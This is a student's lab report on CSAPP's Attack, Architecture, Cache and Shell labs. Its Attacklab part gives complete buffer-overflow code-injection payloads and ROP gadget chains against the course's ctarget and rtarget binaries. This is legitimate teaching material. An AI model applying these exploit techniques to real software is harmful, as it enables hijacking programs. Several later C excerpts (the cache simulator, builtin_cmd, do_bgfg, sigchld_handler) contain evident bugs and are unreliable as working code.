## e 实验环境变动

因为 OS 课的需求，从虚拟机换成了双系统，从之后的实验环境如下：

![image-20220608191907066](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608191907066.png)

终端也从`sprout@sprout-virtual-machine`变为`sprout@sprout-KLVL-WXX9`：

![image-20220608192026591](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608192026591.png)

## 3 Attacklab

### Part I: Code Injection Attacks

#### Level 1（Phase 1）

这一部分的目的是，通过缓冲区写溢出的方式，将返回值修改至函数`touch1()`。

首先我们需要反汇编`ctarget`，找到相应的函数信息。

![image-20220608195512498](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608195512498.png)

实验`Writeup`告诉我们，执行的是`test`函数，这个函数位于`0x0000000000401968`处，其调用了`getbuf`函数，这个函数的反汇编：

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

这里的第一行告诉我们栈上空间为`0x28`也就即40个字节，所以只需要将前40个字节随便填写，后面改成`touch1`的地址即可。查反汇编得知这个函数的地址在`0x00000000004017c0`。

实验Writeup提醒：注意字节序的问题。我的电脑是小端机，所以提供给`hex2raw`的字符串可以是：

```
20 11 18 86 20 11 18 86 20 11 18 86 20 11 18 86 20 11 18 86 20 11 18 86 20 11 18 86 20 11 18 86 20 11 18 86 20 11 18 86 c0 17 40
```

> 为达到验证目的，今后无用字符都用本人学号来填充。

保存为`level1.txt`，做测试。

![image-20220608204209576](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608204209576.png)

#### Level 2（Phase 2）

这一部分需要注入代码，实现类似Level1的结果——调用`touch2()`。

根据Writeup的代码，想要成功，不仅是要把返回值设置成`touch2`的地址，还要把第一个参数设置成`cookie`，也就是我们这里的`0x59b997fa`，其中第一个参数放在`%rdi`寄存器中。

通过之前的反汇编代码，查到`touch2()`的地址为`0x00000000004017ec`。

```assembly
movq	$0x59b997fa, %rdi
pushq	$0x4017ec
retq
```

这里用`ret`，通过弹出之前将`touch2`函数地址压栈的结果，将`touch2`的地址传给了PC。

将上面这三条代码保存，让 gcc 生成汇编。

![image-20220608211448135](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608211448135.png)

汇编代码序列是

```
48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3
```

现在我们要将这段程序放在栈的特定位置，冒充数据，然后在之前的`touch1`位置改成这段程序的地址。这里我们选择在栈的开始位置注入这段代码，现在的任务是找到`%rsp`在哪。

借助 GDB 来找：

![image-20220608211822512](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608211822512.png)

所以`%rsp`在`0x5561d668`，构造字符串：【注入代码】-【无用字符】-【注入代码地址】

```
48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 68 D6 61 55
```

保存为`level2.txt`，做测试。

![image-20220608212339377](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608212339377.png)

#### Level 3（Phase 3）

这一部分和前面差不多，只不过传入的参数从`int`变成了`char*`也就是字符串。

Writeup中说，提供给我们`hexmatch`函数进行判断，所以我们只需要传入一个字符串`59b997fa`即可（注意结尾的`\0`）。

并且，根据提示

> When functions `hexmatch` and `strncmp` are called, they push data onto the stack, overwriting portions of memory that held the buffer used by `getbuf`. As a result, you will need to be careful where you place the string representation of your cookie.

这说明`hexmatch`调用时可能会覆盖`getbuf`栈帧的数据，所以需要小心对待字符串位置。

再看看给我们的字符串地址：

```C
char *s = cbuf + random() % 100;
```

说明`s`的位置是随机的，保险起见，这里字符串我们选择放在`test`函数的栈帧中。用 GDB 找相应的 `%rsp` 位置：

![image-20220608215351117](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608215351117.png)

注入代码为：

```assembly
movq	$0x5561dca8, %rdi
pushq	$0x4018fa
retq
```

之后的步骤和 Level 2 差不多，就不一步步截图了，最后构造出来的字符串可以是：

```
48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

保存为`level3.txt`，做测试。

![image-20220608220242882](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608220242882.png)

### Part II: Return-Oriented Programming

**限制**：栈上不可插入可执行代码。

需要在已有程序中寻找以`ret`结尾的特定指令序列（称之为`gadget`），每个`gadget`结束后跳转到下一个`gadget`，就这样连续执行一系列的指令代码来对程序进行攻击。

#### Level 2（Phase 4）

需要做的和 Phase 2 一样，只不过处理手段要按照**限制**来做。

README 提示我们，`gadget`需要从`farm.c`中获取，并且编译的时候需要`-Og`，那么我们先编译`fram.c`，获得汇编代码，看看有哪些可以用。

> - All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions `start_farm` and `mid_farm`.
>
> - You can do this attack with just two gadgets. 

我们在 Phase 2 的汇编代码中用到

```assembly
movq	$0x59b997fa, %rdi
pushq	$0x4017ec
retq
```

用`gadget`来做，需要用到两个指令：`popq`和`movq`。`popq`会把栈顶的 cookie 弹出到某寄存器，再用`movq`命令传送给`%rdi`，也即

```assembly
popq	%rax
movq	%rax, %rdi
```

查表得知，第一行的指令为`58`，可以用

```assembly
0000000000000035 <setval_424>:
  35:	f3 0f 1e fa          	endbr64 
  39:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  3f:	c3 
```

> 注意这里是在 farm.c 中的地址，要想使用，待会还需要获得这段代码在 `rtarget` 内的值。

第二行的指令为`48 89 C7`，可以用

```assembly
0000000000000014 <addval_273>:
  14:	f3 0f 1e fa          	endbr64 
  18:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  1e:	c3   
```

再将`rtarget`反汇编，我们所需要的两段`gadget`的地址分别是：`0x4019b9`、`0x4019a2`。

![image-20220608230128049](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608230128049-16547004886541.png)

![image-20220608230202849](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608230202849.png)

所以我们构造的字符串可以是：

```
20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 B9 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

保存为`level2_4.txt`，做测试。

![image-20220608231422239](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608231422239.png)

#### Level 3（Phase 5）

需要做的和 Phase 3 一样，只不过处理手段要按照**限制**来做。

在 Level 3 中，栈的位置是随机的，只能用`栈顶地址 + 偏移量`来找到字符串。

重复 Phase 3 的思路：首先：`movq	%rsp, %rax`，这个指令的指令字节为 `48 89 e0`，这一步的地址是`0x401a06`。

![image-20220608232117501](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608232117501.png)

然后：`movq	%rax, %rdi `，这个指令的指令字节为 `48 89 c7`，这一步的地址是`0x401a06`。

![image-20220608232242042](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608232242042.png)

> 其实这一步有更加现成的`gadget`，但是还是按照要求从farm里找。

然后：`popq	%rax`，这个指令的指令字节为`58`，这一步的地址是`0x4019cc`。

![image-20220608232447369](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608232447369.png)

然后：`movl	%eax, %edx`，这个指令的指令字节为`89 c2`，这一步的地址是`0x4019dd`。

![image-20220608232546481](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608232546481.png)

然后：`movl	%edx, %ecx`，这个指令的指令字节为`89 d1`，这一步的地址是`0x401a70`。

![image-20220608232731373](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608232731373.png)

然后：`movl	%ecx, %esi`，这个指令的指令字节为`89 ce`，这一步的地址是`0x401a13`。

![image-20220608232834517](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608232834517.png)

然后：`lea	(%rdi, %rsi, 1), %rax`，这个指令直接可以找到，地址是`0x4019d6`。

![image-20220608233021753](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608233021753.png)

最后：`movq	%rax, %rdi`，这个指令上一 Phase 用过，位于`0x4019a2`。

总上，我们构造一个字符串：

```
20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 20 11 16 86 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

保存为`level3_5.txt`，做测试：

![image-20220608233547752](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220608233547752.png)

### 实验总结

是一个做起来非常有趣的 lab！也学到了很多东西！我们一般做程序开发，都忽视了缓冲区的安全问题，在我原来的印象中，这个安全问题就是 Segmentation Fault 之类的，没想到还可以用来做程序攻击，还能想到利用自己的子程序段攻击自己的方法，感觉收获颇丰！

并且，学完之后对栈的理解更加地深入，今后也会在程序设计中更多的注意到缓冲区（更宽泛地讲：程序）的安全问题。

## 4 Architecturelab

> 由于实验 Writeup 较老，与最新的 gcc 出现了一些适配问题，经过一些尝试找到了成功编译 sim 的方法：
>
> - 在 `./sim` 下各个子文件夹的 `Makefile` 中的 `CFLAGS` 和 `LCFLAGS` 后面加上 `-fcommon`，如
>
> ```makefile
> CFLAGS=-Wall -O1 -g -fcommon
> LCFLAGS=-O1 -fcommon
> ```

### Part A

在 `./sim/misc` 下完成这一部分。这一部分需要我们用 `Y86-64` 汇编实现 `examples.c` 中的三个与链表有关的函数。

```C
/* linked list element */
typedef struct ELE {
    long val;
    struct ELE *next;
} *list_ptr;

/* sum_list - Sum the elements of a linked list */
long sum_list(list_ptr ls);
/* rsum_list - Recursive version of sum_list */
long rsum_list(list_ptr ls);
/* copy_block - Copy src to dest and return xor checksum of src */
long copy_block(long *src, long *dest, long len);
```

#### sum_list

链表迭代求和函数，这个比较简单，直接给出：（篇幅限制，这里仅仅给出一些关键代码，完整代码见`./sim/misc/sum_list.ys`）

```assembly
main:
        irmovq	ele1, %rdi 
        call	sum_list
        ret
sum_list:
        irmovq	$0, %rax
        jmp	test
while:
        mrmovq	(%rdi), %rsi
        addq	%rsi, %rax
        mrmovq	8(%rdi), %rdi
test:
        andq	%rdi, %rdi
        jne	while
        ret
```

之后，先用`yas`汇编，再用`yis`进行模拟，结果如图：

![image-20220609112008929](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609112008929.png)

执行Writeup里的链表example（分别是`0xa`，`0xb0`，`0xc00`），得到结果应该是`0xcba`，这与`%rax`结果相符。

#### rsum_list

改用递归方法进行求和，这个也比较简单，需要注意的是对退出条件需要做检查。

```assembly
rsum_list:
        andq	%rdi, %rdi
        je	rec_exit
        mrmovq	(%rdi), %rbx
        mrmovq	8(%rdi), %rdi
        pushq	%rbx
        call	rsum_list
        popq	%rbx
        addq	%rbx, %rax
        ret
rec_exit:
        irmovq $0, %rax
        ret
```

之后，先用`yas`汇编，再用`yis`进行模拟，结果如图：

![image-20220609113356514](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609113356514.png)

结果应该是`0xcba`，这与`%rax`结果相符。

#### copy_block

这一部分比前面又复杂了一点，不过只是工作量上的。要求我们把一个数组复制到另一个数组，并且还要计算各个数组项的 Xor 值。但是写起来思路还是比较简单，按照 C 代码的逻辑顺序来改写即可。

```assembly
copy_block:
        irmovq	$8, %r8
        irmovq	$1, %r9
        irmovq	$0, %rax
        andq	%rdx, %rdx
        jmp	should_exit
while:
        mrmovq	(%rdi), %r10
        addq	%r8, %rdi
        rmmovq	%r10, (%rsi)
        addq	%r8, %rsi
        xorq	%r10, %rax
        subq	%r9, %rdx
should_exit:
        jne	while
        ret
```

之后，先用`yas`汇编，再用`yis`进行模拟，结果如图：

![image-20220609125613522](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609125613522.png)

结果应该是`0xcba`，这与`%rax`结果相符。

### Part B

在 `./sim/seq` 下完成这一部分。这一部分需要完成的是扩展指令集（参考书上4.51和4.52），加入`iaddq`指令。

`iaddq`指令的作用是：将一个立即数`V`加到寄存器`rB`中。那接下来主要就是需要修改`seq-full.hcl`这个文件。

一条指令在处理器中分为 Fetch，Decode，Execute，Memory 和 Write back 5个阶段，下面分阶段来修改。

#### I.	Fetch

这一阶段涉及到的三个信号为：`instr_valid`（判断指令是否合法）、`need_regids`（判断指令中是否包括寄存器）、`need_valC`（判断指令中是否包括立即数）。

![image-20220609131721810](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609131721810.png)

#### II.	Decode

这一阶段涉及到的四个信号为：`srcA`（数据来源A应该从哪个寄存器来）、`srcB`（数据来源B应该从哪个寄存器来）、`dstE`（数据E应该写到哪个寄存器中）、`dstM`（数据M应该写到哪个寄存器中）。

由于我们的`iaddq`只需要用到`srcB`（有一个数据来自于`rB`）和`dstE`（结果存放于`rB`），所以做如下修改：

![image-20220609131737111](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609131737111-16547518582213.png)

#### III.	Execute

这一阶段涉及到的四个信号为：`aluA`（操作数A应该从哪来）、`aluB`（操作数B应该从哪来）、`alufun`（执行算术种类从哪里来）、`set_cc`（是否需要修改条件码）。

`iaddq` 进行的运算是`valB + valC`，于是应当修改

![image-20220609132750834](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609132750834-16547524714065.png)

#### IV.	Others

这条指令不涉及 Memory 和 Write back 阶段，所以无需修改了。

#### 测试

接下来，按照 Writeup 的指导开展指令测试。

> 这里还遇到一些编译上的版本不匹配问题，参考网上的做法改动，就可以正常编译。做法如下：
>
> - Makefile 第 20 行改为
>
> ```bash
> TKINC=-isystem /usr/include/tcl8.6
> ```
>
> - Makefile 第 26 行改为
>
> ```c
> CFLAGS=-Wall -O2 -DUSE_INTERP_RESULT
> ```
>
> - 注释掉`/sim/pipe/psim.c 806、807 line`和`/sim/seq/ssim.c 844、845 line`。（glibc 新版中弃用了 `matherr()` ）

1. Testing your solution on a simple Y86-64 program.

![image-20220609133749733](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609133749733.png)

![image-20220609133805681](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609133805681.png)

2. Retesting your solution using the benchmark programs.

![image-20220609133951592](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609133951592.png)

![image-20220609134003281](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609134003281.png)

3. Performing regression tests.

![image-20220609134121262](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609134121262-16547532816837.png)

![image-20220609134152726](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609134152726.png)

三次测试全部成功。

### Part C

在 `./sim/pipe` 下完成这一部分。这一部分要做的是：修改 `sim/pipe/pipe-full.hcl` 和 `sim/pipe/ncopy.ys` 的内容，优化程序运行效率。

- 利用新加入的`iaddq`指令，可以把原来自增、自减需要的多条指令缩减为一条，提高效率；
- 利用循环展开的方法，减少在条件分支上所消耗的判断次数；
- 利用 CPU 的流水线特性，提前为下一步读取内存内容，减少气泡（Bubble）的产生，提高效率。

这一部分自由度比较大，一些小的优化就不列出来了。代码位于`./sim/pipe/ncopy.ys`，最终结果：

![image-20220609163120908](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609163120908.png)

![image-20220609163131927](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220609163131927.png)

### 实验总结

本实验较为深入地让我掌握了 `x86` 汇编使用，结合 COD 上学到的流水线设计知识，我体会到如果利用处理器的一些流水级特性，可以合理利用汇编程序排布来优化性能。这是对性能极致的追求。

另外，由于实验发布日期较老，现在已经有了比 `x86` 更加简洁、好懂的 `RISC-V` 架构，我觉得也可以在 `RISC-V` 指令集架构上重新做一做这个实验。

## 5 Cachelab

### Part A

这一部分的目标是用 C 语言来实现一个 LRU 策略的 Cache 模拟器。其输入来自 `valgrind` 这个小软件，其能输出执行一个程序引起的内存变化。后面做测试用到的测试文件是通过这个小软件已经生成好的了，测试时只需要运行测试框架即可。

参数格式：

```shell
$ ./csim [-hv] -s <s> -E <E> -b <b> -t <tracefile>
```

具体设计（结合 Writeup 的一些提示）：

- 把 Cache 就看成一个数组，每个元素都是一个结构体 `cache_group`。

```C
struct cache_line {
    int valid; // 有效位
    int tagl; // 标记
    int last_use; // 最后使用的时间
};
struct cache_group {
    struct cache_line* addr; // 第一行的地址，有多少行依据全局参数E来定
};
struct cache {
    struct cache_group* addr; // 第一组的地址，有多少组依据全局参数S来定
};
```

- 用 `getopt` 函数快速解析命令行输入。
- 在阅读 trace 文件时，用 `fscanf` 函数。
- 动态分配内存。
- 为了实现 LRU 替换算法，由于不方便使用链表，所以引入时间戳，每次遍历 Cache 寻找 tag 时，自动把当前最近最少使用的行号计算出来。

最后只要输出命中数、不命中数和驱逐数即可，所以对偏移之类的不用考虑。

**核心**代码（只保留思路，省略变量声明以及动态分配的内存的回收语句）如下：

```c
void parse(int argc, char** argv) {
    while ((arg_name = getopt(argc, argv, "hvs:E:b:t:")) != -1) {
        if (arg_name == 's') {
            s = atoi(optarg);
        }
        // ... Omitted E and b
        else if (arg_name == 't') {
            fp = fopen(optarg, "r");
        }
        else exit(1);
    }
}

int visit(long address, int time) {
    // 访问
    long tag = address >> (s + b);
    int group = address >> b & ((1 << s) - 1);

    struct cache_group _group = _cache.addr[group];

    int evict = 0;
    int empty = -1;

    for (int line = 0; line < E; line++) {
        if (_group.addr[line].valid) {
            if (_group.addr[line].tag == tag) {
                HI++;
                _group.addr[line].last_use = time; // 更新当前块最后一次用到的时间
                return 0;
            }

            if (_group.addr[evict].last_use <= _group.addr[line].last_use) {
                evict = line; // 一并做找最小值
            }
        }
        else empty = line;
    }

    // 未命中
    MI++;
    if (empty != -1) {
        // 有空的可用
        _group.addr[empty].valid = 1;
        _group.addr[empty].tag = tag;
        _group.addr[empty].last_use = time;
        return 1;
    }
    else {
        // 需要替换
        EV++;
        _group.addr[evict].tag = tag;
        _group.addr[empty].last_use = time;
        return 2;
    }
}

int simulate() {
    // 依s, E动态分配内存构建Cache，省略
    int time = 0;
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (buffer[0] == 'I') continue; // 不需处理的情况

        sscanf(buffer, " %s %lx,%d", operation, &address, &size);
        if (operation[0] == 'M') HI++;
        if (operation[0] != 'S' && operation[0] != 'L' && operation[0] != 'M') return -1;
        int ret = visit(address, time);
        
        time++;
    }
}

int main(int argc, char** argv) {
    parse(argc, argv);
    simulate();
    printf("hits:%d missed:%d evictions:%d\n", HI, MI, EV);
    return 0;
}
```

测试结果（用最长的文件做测试用例）：

![image-20220610214103739](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220610214103739.png)

![image-20220610214209792](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220610214209792.png)

### Part B

这一部分要求我们实现一个矩阵转置函数，要求尽可能多的利用 Cache（即增加命中率）。由于预估到这个优化过程比较漫长，我就简单的说一下自己的思路。

给我们的矩阵是不确定大小的，但是给我们的 Cache 是确定大小的，由于 Cache 的特性，我们总有办法让一个数组比 Cache 小，以获得最高的命中率，这样我们就可以把一个大的矩阵分块，因为转置是一个对称的操作，所以这种分块是合理的。

不仅是读上的顺序有讲究，写回新矩阵的顺序也有讲究，因为写同样关系到 Cache 的命中率，在我们处理小矩阵的时候，只处理小矩阵范围内的写回，这样可以维持住 Cache 的高命中率。

## 6 Shelllab

### 实验目的

修改 `tsh.c` 文件，完善下面七个函数，使其成为一个 tiny shell。

- `eval`，解析命令行。
- `builtin_cmd`，识别并处理内建命令：`quit`，`fg`，`bg`和`jobs`。
- `do_bgfg`，实现`bg`和`fg`内建命令。
- `waitfg`，等待一个前台作业结束。
- `sigchld_handler`：捕捉`SIGCHLD`信号。
- `sigint_handler`：捕捉`SIGINT`信号。
- `sigtstp_handler`：捕捉`SIGTSTP`信号。

### I. eval

这个函数的主要作用是根据用户的输入进行执行，也是我们主循环中最重要的函数。主要要求是：

- If the user has requested a built-in command (quit, jobs, bg or fg) then execute it immediately. 

- Otherwise, fork a child process and run the job in the context of the child. 
- If the job is running in the foreground, wait for it to terminate and then return.

同时根据书上的讲述，这里要小心并发竞争问题，以及进程组的管理问题。这里语法分析函数已经给我们提供，其返回值为是否后台作业，我们只需要组织一下整体框架即可。

需要注意的是：

- 引入信号 mask 来避免在一些情况中收到信号，错误地执行。（解决并发竞争）
- 区分子进程组和 tsh 进程组，避免 kill 子进程组把 tsh 一起 kill 了。

**核心**代码（只保留思路，省略变量声明以及错误检测）如下：

```C
void eval(char *cmdline) {
    int bg = parseline(buffer, argv);
	sigset_t mask_all, mask_one, prev_one;
    sigfillset(&mask_all); // 初始化信号集合，将信号集合设置为所有信号的集合
    sigemptyset(&mask_one); // 初始化信号集合set，将set设置为空
    sigaddset(&mask_one, SIGCHLD); // 将信号SIGCHLD加入到信号集合之中

    if (!builtin_cmd(argv)) {
        sigprocmask(SIG_BLOCK, &mask_one, &prev_one); // 防止addjob和信号处理竞争
        pid_t pid = fork();
        if (pid == 0) {
            // 子进程
            // 区分子进程组和tsh进程组，避免kill子进程组把tsh一起kill了
            sigprocmask(SIG_SETMASK, &prev_one, NULL);
            execve(argv[0], argv, environ);
        }
        // 父进程
        sigprocmask(SIG_BLOCK, &mask_all, NULL); // 锁住所有信号
        addjob(jobs, pid, bg ? BG : FG, cmdline);
        if (!bg) {
            // 前台进程
            sigprocmask(SIG_SETMASK, &prev_one, NULL);
            waitfg(pid); // 等待前台作业结束
        }
        else {
            sigprocmask(SIG_SETMASK, &prev_one, NULL); // 阻塞，防止被中断，造成数据不一致问题
        }
    }
    return;
}
```

### II. builtin_cmd

这里比较简单，因为各个内建指令的执行函数都在本函数外部定义，所以只需要调用即可。

```C
int builtin_cmd(char **argv) {
    if (strcmp(argv[0], "quit") == 0) {
        exit(0);
    }
    else if (strcmp(argv[0], "fg") == 0 || strcmp(argv[0], "bg") == 0) {
        do_bgfg(argv);
    }
    if (strcmp(argv[0], "jobs") == 0) {
        listjobs(jobs);
    }
    else return 0;     /* not a builtin command */
}
```

### III. do_bgfg

这个函数用来修改作业的 fg 和 bg 性质。要点如下：

- 利用已有函数 `getjobpid` 来获得 JCB 结构体，来修改信息。
- 如果设置为前台作业，需要 `waitfg` 来等待前台作业结束。

核心代码如下：

```C
void do_bgfg(char **argv) {
    int id;
    struct job_t* job = NULL;
    if (sscanf(argv[1], "%d", &id) > 0) {
        job = getjobpid(jobs, id);
    }
    else if (sscanf(argv[1], "%d", &id) > 0) {
        job = getjobjid(jobs, id);
    }
    else return; // 命令格式错误

    // 发送信号：发送到进程组采用负数
    kill(-(job->pid), SIGCONT);
    if (strcmp(argv[0], "bg") == 0) {
        job->state = BG;
    }
    else {
        job->state = FG;
        waitfg(job->pid);
    }
    return;
}
```

### IV. waitfg

这个函数用于等待前台作业完成。Writeup 中提示我们：In `waitfg`, use a busy loop around the sleep function. 

这里不直接 pause 的原因是外部信号可能会恰好在执行 pause 前到来，这样就会造成竞争，之后程序就将一直 pause 等待这个已经来过的信号（自然不会再来了）。

```C
void waitfg(pid_t pid) {
    while (pid == fgpid(jobs)) {
        sleep(0);
    }
    return;
}
```

### V. sigchld_handler

这个函数是 `SIGCHLD` 信号的响应函数。 

- 正常终止；
- 受到信号中止；
- 被信号暂时挂起。

为了防止 `deletejob` 被中断，我们仍需要用 mask 的方法来禁止信号。

核心代码如下：

```C
void sigchld_handler(int sig) {
    sigset_t mask_one, prev_one;
    sigfillset(&mask_one);
    while ((pid = waitpid(-1, &status, WNOHANG | WUNTRACED)) > 0) {
        sigprocmask(SIG_BLOCK, &mask_one, &prev_one);
        if (WIFEXITED(status) || WIFSIGNALED(status)) {
            deletejob(jobs, pid);
        }
        else if (WIFSTOPPED(status)) {
            struct job_t* job = getjobjid(jobs, pid);
            job->state = ST;
        }
        sigprocmask(SIG_BLOCK, &prev_one, NULL);
    }
    return;
}
```

### VI. sigint_handler, sigtstp_handler

这两个函数都是用来处理键盘信号的，而且都比较简单，所以放在一起。

- `sigint_handler`用来响应 Ctrl-C 操作，并将该信号发送到所有前台程序；
- `sigtstp_handler`用来捕获响应 Ctrl-Z 操作，并将该信号发送到所有前台程序。

使用 kill 来发送信号即可。

```C
void sigint_handler(int sig) {
    pid_t pid = fgpid(jobs);
    if (pid > 0) {
        kill(-pid, sig);
    }
    return;
}
void sigtstp_handler(int sig) {
    pid_t pid = fgpid(jobs);
    if (pid > 0) {
        kill(-pid, sig);
    }
    return;
}
```

### 实验测试

测试 `test15` 是总的测试，运行这一个以作示例。

![image-20220610123105363](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220610123105363.png)

![image-20220610123123778](/media/sprout/SproutUSTC/CSAPP  Lab Report2.assets/image-20220610123123778.png)

可以看到除了一些错误信息打印格式不同外，其他的控制流都相同。

### 实验总结

这个实验是操作系统方面的实验，与我们 OS 课上的实验虽然主题相近（都是写一个 tiny shell）但是功能差别非常大，我觉得完成这个实验对操作系统的理解也是一种补充。比如以下部分：

- 处理并发竞争问题（`addjob`，`deletejob`）；
- 处理进程组问题（作业 job 的抽象）；
- 信号掩盖函数的使用，以及不要用信号计数。

总而言之对 OS 是很好的补充，收获较大。

